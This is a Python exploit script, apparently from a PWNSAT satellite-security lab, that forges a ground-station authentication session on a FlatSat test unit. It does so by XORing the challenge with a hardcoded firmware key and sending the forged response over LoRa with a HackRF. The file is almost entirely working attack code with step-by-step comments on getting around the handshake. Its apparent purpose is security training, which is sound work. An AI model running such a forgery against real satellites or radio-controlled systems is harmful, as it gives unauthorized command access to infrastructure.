#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 05_gs_auth_spoofing_rf.py -- forges a valid ground-station authentication
# session without ever holding real credentials, exploiting a static,
# hardcoded XOR "shared key" in the GS_ACCESS challenge-response
# handshake (New-firmware/worker.cpp):
#
#   static const uint32_t gs_shared_auth_key = 0xC0DEFACEUL;
#   static uint32_t groundStationExpectedResponse(uint32_t challenge) {
#     return challenge ^ gs_shared_auth_key;
#   }
#
# This key is not a secret in any meaningful sense: it's the exact same
# literal `0xC0DEFACE` this repo's own ground-station tooling ships as a
# hardcoded default (pwnsat_tools/usb_tc_send.py's DEFAULT_ARGS
# ["auth_key"] and compute_gs_response()). Anyone with the firmware
# binary (which this key is compiled directly into, in cleartext -- no
# obfuscation) or this codebase already has it. And even without either:
# the FlatSat sends its own challenge back in CLEARTEXT (well,
# AES-encrypted with the ALSO-static, ALSO-known key from attack 01 --
# New-firmware doesn't add any second layer of protection here) inside
# the GS_ACCESS TM's own payload, bytes 5-8. A single eavesdropped
# handshake (attack 01) would let an attacker recover the key directly
# via challenge XOR response, with zero prior knowledge of this
# firmware's source.
#
# How this script does it (the "already know the key" path -- the more
# direct of the two, since we DO have the source):
#   1. Send GS_ACCESS phase 0x00 (payload: 0x00) -- asks the FlatSat to
#      issue a fresh challenge.
#   2. Listen for the GS_ACCESS TM reply, decrypt it, read the 32-bit
#      challenge back out of its own payload (offset 5, little-endian --
#      see telemetrySPPTransmitGroundAccessStatus()).
#   3. Compute response = challenge XOR 0xC0DEFACE.
#   4. Send GS_ACCESS phase 0x01 (payload: 0x01 + response, big-endian --
#      see commandGroundStationAccessHandler()'s own parsing) with that
#      response.
#   5. Listen again -- auth_state 0x01 in the reply means the session is
#      now active (mission_ctx.groundStationSessionActive = true, valid
#      for gs_session_window_ms = 5 minutes), granting whatever
#      GS-gated behavior groundStationCommandAllowed()/
#      groundStationGateOpen() unlock, without ever touching a real
#      credential.
#
# PREREQUISITE -- GPS RANGE GATE: commandGroundStationAccessHandler()
# unconditionally requires groundStationGpsUsable() (a real fix) AND
# groundStationWithinRange() (within gs_station_radius_m, 35km, of the
# ground station's own hardcoded coordinates) for EITHER phase, before
# any key/response logic runs at all -- confirmed by reading the
# handler's own early-return checks. If the FlatSat's real GPS position
# isn't within that radius, this will fail with "GS RANGE LOCK"
# regardless of how correct the forged response is. See this attack's
# steps.txt for how this was worked around during testing (this
# session's FlatSat is physically nowhere near the ground station's
# real coordinates).
#
# Needs a Python with gnuradio importable -- run it and this script will
# say so with concrete next steps if you've got the wrong one, see
# require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3).

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

sys.stdout.reconfigure(line_buffering=True)

from pwnsat_packets import build_command_packet, decode_packet, decrypt_payload  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402
from pwnsat_catsniffer_rx import CatSnifferRX  # noqa: E402
from pwnsat_rtlsdr_rx import RtlSdrRX  # noqa: E402

GS_ACCESS_APID = 0x12
GS_SHARED_AUTH_KEY = 0xC0DEFACE  # New-firmware/worker.cpp's gs_shared_auth_key, verbatim


def parse_gs_access_tm(raw: bytes) -> dict:
    """Decrypts and unpacks a GS_ACCESS TM payload -- layout matches
    telemetrySPPTransmitGroundAccessStatus() exactly:
    spacecraft_id(1) phase(1) auth_state(1) gs_status(1) gps_status(1)
    challenge(u32 LE) session_remaining_s(u16 LE) handshake_remaining_s(u16 LE)."""
    pkt = decode_packet(raw)
    plain = decrypt_payload(pkt.data)
    if len(plain) < 13:
        raise ValueError(f"GS_ACCESS TM payload too short: {len(plain)} bytes")
    return {
        "spacecraft_id": plain[0],
        "phase": plain[1],
        "auth_state": plain[2],
        "gs_status": plain[3],
        "gps_status": plain[4],
        "challenge": int.from_bytes(plain[5:9], "little"),
        "session_remaining_s": int.from_bytes(plain[9:11], "little"),
        "handshake_remaining_s": int.from_bytes(plain[11:13], "little"),
        "sequence_count": pkt.sequence_count,
    }


def find_gs_access_reply(frames: list, verbose: bool) -> dict | None:
    for frame in frames:
        raw = getattr(frame, "raw", frame)
        try:
            pkt = decode_packet(raw)
        except ValueError:
            continue
        if pkt.packet_type == 1:
            continue  # our own uplink leaking into the RX, see 00's classification note
        if pkt.apid != GS_ACCESS_APID:
            continue
        try:
            return parse_gs_access_tm(raw)
        except ValueError as exc:
            if verbose:
                print(f"    (GS_ACCESS-shaped frame, couldn't parse: {exc})")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--auth-key", type=lambda x: int(x, 0), default=GS_SHARED_AUTH_KEY,
                        help=f"the 'shared' key to forge with (default 0x{GS_SHARED_AUTH_KEY:08X}, "
                             f"gs_shared_auth_key verbatim from worker.cpp -- pass a different "
                             f"value to prove the point that ANY wrong guess fails cleanly)")
    parser.add_argument("--seq", type=int, default=1, help="starting SPP sequence count")
    parser.add_argument("--tx-gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--rx-device", choices=("rtlsdr", "catsniffer"), default="rtlsdr",
                        help="dedicated RX radio, same two-radio setup as attack 00 -- a "
                             "single HackRF can't turn around fast enough to catch the "
                             "challenge reply (default rtlsdr; stop C3 and its own RTL-SDR "
                             "bridge first if using this)")
    parser.add_argument("--catsniffer-port", default=None,
                        help="only used with --rx-device catsniffer")
    parser.add_argument("--rx-gain", type=int, default=30,
                        help="only used with --rx-device rtlsdr")
    parser.add_argument("--listen-seconds", type=float, default=1.5,
                        help="how long to wait after each TX before checking the RX")
    parser.add_argument("--retries", type=int, default=3,
                        help="attempts per phase before giving up (RF noise/packet loss)")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output and the RX device's status messages")
    args = parser.parse_args()

    print("=" * 66)
    print("PWNSAT GS auth spoofing -- forging a session with the hardcoded")
    print(f"gs_shared_auth_key (0x{args.auth_key:08X}), no real credentials involved.")
    print(f"TX: HackRF (918MHz uplink).  RX: {args.rx_device} (916MHz downlink, continuous).")
    print("=" * 66)

    if args.rx_device == "catsniffer":
        rx = CatSnifferRX(port=args.catsniffer_port, verbose=not args.quiet)
    else:
        rx = RtlSdrRX(rf_gain=args.rx_gain, verbose=not args.quiet)
    rx.start()
    time.sleep(0.5)

    try:
        # --- Phase 0x00: request a challenge ---
        challenge = None
        for attempt in range(1, args.retries + 1):
            print(f"\n[*] Phase 0x00 -- requesting a challenge (attempt {attempt}/{args.retries})...")
            raw_spp = build_command_packet("gs-auth", seq=args.seq + attempt - 1, handshake="start")
            t0 = time.time()
            transmit_packet(raw_spp, frequency=UPLINK_FREQ_HZ, device_args="hackrf",
                            tx_gain=args.tx_gain, verbose=not args.quiet)
            time.sleep(args.listen_seconds)
            frames = rx.take_since(t0)
            reply = find_gs_access_reply(frames, verbose=not args.quiet)
            if reply is None:
                print("    -> no GS_ACCESS reply yet, retrying...")
                continue
            if reply["auth_state"] != 0x00:
                print(f"    -> FlatSat rejected the challenge request: auth_state=0x{reply['auth_state']:02X} "
                      f"gs_status=0x{reply['gs_status']:02X} gps_status=0x{reply['gps_status']:02X} "
                      f"-- likely GS RANGE LOCK or GS ACCESS GPS (see this file's PREREQUISITE note)")
                sys.exit(1)
            challenge = reply["challenge"]
            print(f"    -> challenge issued: 0x{challenge:08X} "
                  f"(handshake window: {reply['handshake_remaining_s']}s)")
            break
        if challenge is None:
            print("\n[!] Never got a challenge back after all retries -- aborting.")
            sys.exit(1)

        # --- Forge the response ---
        response = (challenge ^ args.auth_key) & 0xFFFFFFFF
        print(f"\n[*] Forged response = challenge XOR auth_key = "
              f"0x{challenge:08X} ^ 0x{args.auth_key:08X} = 0x{response:08X}")

        # --- Phase 0x01: submit the forged response ---
        session_confirmed = False
        explicit_rejection = False
        for attempt in range(1, args.retries + 1):
            print(f"\n[*] Phase 0x01 -- submitting forged response (attempt {attempt}/{args.retries})...")
            raw_spp = build_command_packet("gs-auth", seq=args.seq + 10 + attempt,
                                           handshake="finish", challenge=challenge,
                                           auth_key=args.auth_key)
            t0 = time.time()
            transmit_packet(raw_spp, frequency=UPLINK_FREQ_HZ, device_args="hackrf",
                            tx_gain=args.tx_gain, verbose=not args.quiet)
            time.sleep(args.listen_seconds)
            frames = rx.take_since(t0)
            reply = find_gs_access_reply(frames, verbose=not args.quiet)
            if reply is None:
                print("    -> no GS_ACCESS reply yet, retrying...")
                continue
            if reply["auth_state"] == 0x01:
                print(f"    -> ACCEPTED. Session active for {reply['session_remaining_s']}s "
                      f"-- forged, no real credentials ever used.")
                session_confirmed = True
            else:
                print(f"    -> rejected: auth_state=0x{reply['auth_state']:02X} "
                      f"(0x02=AUTH FAIL, 0x03=NO CHALLENGE PENDING)")
                explicit_rejection = True
            break

        print("\n" + "=" * 66)
        if session_confirmed:
            print("[+] GS auth session forged successfully.")
        elif explicit_rejection:
            print("[!] FlatSat explicitly rejected the forged response -- see auth_state above.")
        else:
            # We transmitted every retry; the FlatSat may well have accepted the
            # forgery -- this loop only ever caught its OWN RX packet loss, not a
            # firmware-side rejection (see this attack's steps_rf.txt, "the script
            # can fail to confirm even when the attack DID work": happened at
            # least once before, confirmed accepted via GS_STATUS over the serial
            # link when this exact RX-side confirmation was missed).
            print("[?] No confirmation captured over RF -- inconclusive, NOT necessarily a failure.")
            print("    This script's own RX can miss the reply even when the FlatSat accepted it.")
            print("    Check GS_STATUS on another channel (PWNSAT-C3's serial link, e.g. the")
            print("    'gs-status' command/button) for auth_active before assuming this failed.")
        print("=" * 66)
    finally:
        rx.close()


if __name__ == "__main__":
    main()
